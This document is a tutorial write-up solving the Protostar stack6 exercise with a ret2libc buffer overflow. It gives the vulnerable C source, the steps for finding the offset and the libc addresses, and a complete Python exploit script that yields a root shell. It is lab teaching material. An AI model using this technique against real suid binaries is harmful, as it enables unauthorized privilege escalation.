### Introduction
#### Hey guys , In the last post about buffer overflow we exploited a buffer overflow vulnerability where we were able to inject a shellcode and escalate privileges to root. But that was possible because we were able to overwrite the return address to another address on the stack where we placed our shellcode , but what if the stack is non-executable ? we will perform an attack called ret2libc and that's what we are going to discuss today with protostar - stack6. Without wasting more time let's jump right in !

### ./stack6
#### As always we are given the source code of the binary :
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
        char buffer[64];
        unsigned int ret;

        printf("input path please: "); fflush(stdout);

        gets(buffer);

        ret = __builtin_return_address(0);

        if((ret & 0xbf000000) == 0xbf000000) {
                printf("bzzzt (%p)\n", ret);
                _exit(1);
        }

        printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
        getpath();



}
```
#### What this code is doing is just printing `input path please:` then it stores our input in a buffer of 64 chars and finally it prints it out:
![](/images/binary-exploitation/BOF6/1.png)
#### Our problem is this `if` statement :
```
        if((ret & 0xbf000000) == 0xbf000000) {
                printf("bzzzt (%p)\n", ret);
                _exit(1);
        }
```
#### This is making sure that the return address is not on the stack , which makes it not possible to perform a shellcode injection like we did in the [previous example](/binary-exploitation/bof5/). We can defeat this by a technique called ret2libc.
<br>
<hr>
### ret2libc
#### So what is "ret2libc" ? If we take the word itself : "ret" is return , "2" means to and "libc" is the C library. The idea behind ret2libc is instead of injecting shellcode and jumping to the address that holds that shellcode we can use the functions that are already in the C library. For example we can call the function `system()` and make it execute `/bin/sh`. (Read about `system()` [here](https://www.tutorialspoint.com/c_standard_library/c_function_system.htm)). We will also need to use the function `exit()` to make the program exit cleanly. (Read about `exit()` [here](https://www.tutorialspoint.com/c_standard_library/c_function_exit.htm)).
#### So finally our attack payload will be : "padding --> address of `system()` --> address of `exit()` --> `/bin/sh`" instead of : "padding --> new return address --> NOP --> shellcode".
#### Now let's see how will we do it.
<br>
<hr>
### Exploiation 
#### Again , this will execute `/bin/sh` as root because this binary is an `suid` binary. If it wasn't `suid` we would get a shell as the same user. We can check by using `find` :
`find /opt/protostar/bin/ -perm -4000 | grep stack6`
![](/images/binary-exploitation/BOF6/2.png)
#### As you can see `stack6` is an `suid` binary.
#### So first of all , after we call `system()` we will need to give it `/bin/sh` , how will we do that ? A nice way to do it is to store `/bin/sh` in an environment variable. I created a variable and called it `SHELL` :
![](/images/binary-exploitation/BOF6/3.png)
#### Now we need to find the address of that variable , we can do it from `gdb` by setting a breakpoint at main , then running the program and doing this : `x/s *((char **)environ+x)` where `x` is a number , This will print the address of an environment variable. We will keep trying numbers until we get the address of `SHELL`
#### But I found a better way to do it when I was reading an article on [shellblade](https://www.shellblade.net/). We will use a `c` program to tell us the estimated address.
#### Code :
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(int argc, char **argv)
{
        char *ptr = getenv("SHELL");
        if (ptr != NULL)
        {
                printf("Estimated address: %p\n", ptr);
                return 0;
        }
}
```
![](/images/binary-exploitation/BOF6/4.png)
#### Then we will compile it : `gcc address.c -o address` :
![](/images/binary-exploitation/BOF6/5.png)
#### As you can see it's telling us the address of the environment variable `SHELL`. Now keep in mind that this is not the "exact" address and we will need to go up and down to get the right address.
#### Let's start by finding the offset. As we did before we will use `pattern_create.rb` and `pattern_offset.rb` from metasploit exploitation tools.
`./pattern_create.rb -l 100`
![](/images/binary-exploitation/BOF6/6.png)
#### We have our pattern now let's run the program in gdb and set a breakpoint before main `break *main`. Then we will type `c` to continue and paste the pattern. The buffer will overflow and we will see exactly where did the overflow happen : 
![](/images/binary-exploitation/BOF6/7.png)
#### We got the address `0x37634136` , now let's go back and use `pattern_offset.rb` :
`./pattern_offset.rb -q 0x37634136`
![](/images/binary-exploitation/BOF6/8.png)
#### So after 80 chars the buffer overflows. Next thing to check is the addresses of `system()` and `exit()`. From gdb we will set a break point at main and type `r` to run the program. After it reaches the break point and breaks we can get the address of system by typing `p system` and we will do the same thing for exit `p exit` :
![](/images/binary-exploitation/BOF6/9.png)
#### Address of system : `0xb7ecffb0`
#### Address of exit : `0xb7ec60c0`
#### Lastly we will check the address of `SHELL` again because it's subject to change :
![](/images/binary-exploitation/BOF6/10.png)
#### Address : `0xbffff985` 
#### Let's check our notes :
![](/images/binary-exploitation/BOF6/11.png)
#### Ok , we are ready to write our exploit , we will use struct `import struct` like we did before. We will create a variable for the chars we will use to fill the buffer and call it `buffer` , its value will be 80 A's.
`buffer = "A" * 80`
#### Then we will create 3 variables to hold the addresses of `system()` , `exit()` and `SHELL`. We will use struct to reverse the addresses.
`system = struct.pack("I" ,0xb7ecffb0)`
<br>
<br>
`exit = struct.pack("I" ,0xb7ec60c0)`
<br>
<br>
`shell = struct.pack("I" ,0xbffff985)`
#### And finally we will print the payload.
`print buffer + system + exit + shell`
#### Final script :
```
import struct

buffer = "A" * 80
system = struct.pack("I" ,0xb7ecffb0)
exit = struct.pack("I" ,0xb7ec60c0)
shell = struct.pack("I" ,0xbffff985)

print buffer + system + exit + shell
```
![](/images/binary-exploitation/BOF6/12.png)
#### We have to remember that the address of `SHELL` is not the exact address and we will need to go up or down for a little bit. We will execute the script and redirect the output to a file and name it payload. `python /tmp/stack6.py > /tmp/payload` , Then we will cat the file and pipe the output to `./stack6` :
![](/images/binary-exploitation/BOF6/13.png)
#### And no shell , After going up and down by editing the address in the python script I finally got the right address which is `0xbffff992` :
`python /tmp/stack6.py > /tmp/payload`
<br>
<br>
`cat /tmp/payload - | ./stack6`
![](/images/binary-exploitation/BOF6/14.png)
#### root shell!
#### So after editing the address of `shell` variable , the script will be like this :
```
import struct

buffer = "A" * 80
system = struct.pack("I" ,0xb7ecffb0)
exit = struct.pack("I" ,0xb7ec60c0)
shell = struct.pack("I" ,0xbffff992)

print buffer + system + exit + shell
```
